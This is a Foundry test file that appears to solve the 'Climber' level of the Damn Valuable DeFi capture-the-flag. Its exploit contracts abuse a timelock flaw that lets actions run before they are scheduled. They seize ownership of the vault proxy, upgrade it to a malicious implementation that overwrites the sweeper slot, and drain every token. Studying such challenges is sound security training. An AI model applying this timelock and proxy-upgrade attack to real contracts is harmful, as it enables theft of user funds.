// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

contract MaliciousUpgrade is ClimberVault {
    event ChangedSweeper(address newSweeper);

    function setSweeper(address newSweeper) public {
        address oldSweeper;
        assembly {
            let slot := 202
            sstore(slot, newSweeper)
        }
        emit ChangedSweeper(newSweeper);
    }
}

contract AttackerContract is Test {
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address attacker;

    constructor(
        address _climberTimelock,
        address _climberImplementation,
        address _climberVaultProxy,
        address _attacker
    ) {
        climberTimelock = ClimberTimelock(payable(_climberTimelock));
        climberImplementation = ClimberVault(payable(_climberImplementation));
        climberVaultProxy = ERC1967Proxy(payable(_climberVaultProxy));
        attacker = _attacker;
    }

    function sendSchedule() public {
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        dataElements[0] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        dataElements[1] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        dataElements[2] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        bytes32 salt = "";

        targets[0] = address(climberVaultProxy);
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", address(attacker));
        targets[1] = address(climberTimelock);
        dataElements[1] =
            abi.encodeWithSignature("grantRole(bytes32,address)", climberTimelock.PROPOSER_ROLE(), address(this));
        targets[2] = address(this);
        dataElements[2] = abi.encodeWithSignature("sendSchedule()");
        climberTimelock.schedule(targets, values, dataElements, salt);
    }

    function startAttack() public {
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        dataElements[0] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        dataElements[1] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        dataElements[2] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        bytes32 salt = "";
        for (uint256 i = 0; i < values.length; i++) {
            values[i] = 0;
        }

        targets[0] = address(climberVaultProxy);
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", address(attacker));
        targets[1] = address(climberTimelock);
        dataElements[1] =
            abi.encodeWithSignature("grantRole(bytes32,address)", climberTimelock.PROPOSER_ROLE(), address(this));
        targets[2] = address(this);
        dataElements[2] = abi.encodeWithSignature("sendSchedule()");
        climberTimelock.execute(targets, values, dataElements, salt);
    }
}

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    //added by me
    // address[] internal targets;
    // bytes[] internal dataElements;
    // uint256[] internal values;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,ss
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(address(climberImplementation), data);

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // emit log_named_address("sweeper", ClimberVault(address(climberVaultProxy)).getSweeper());
        // for (uint256 i = 0; i < 0x100; i++) {
        //     address a = address(uint160(uint256(vm.load(address(climberVaultProxy), bytes32(uint256(i))))));
        //     emit log_named_uint("i", i);
        //     emit log_named_address("a at pos i", a);
        // }
        vm.startPrank(attacker);
        AttackerContract at = new AttackerContract(
            address(climberTimelock), address(climberImplementation), address(climberVaultProxy), attacker
        );
        at.startAttack();
        ClimberVault(address(climberVaultProxy)).upgradeTo(address(new MaliciousUpgrade()));
        MaliciousUpgrade(address(climberVaultProxy)).setSweeper(attacker);
        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), attacker);
        MaliciousUpgrade(address(climberVaultProxy)).sweepFunds(address(dvt));
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
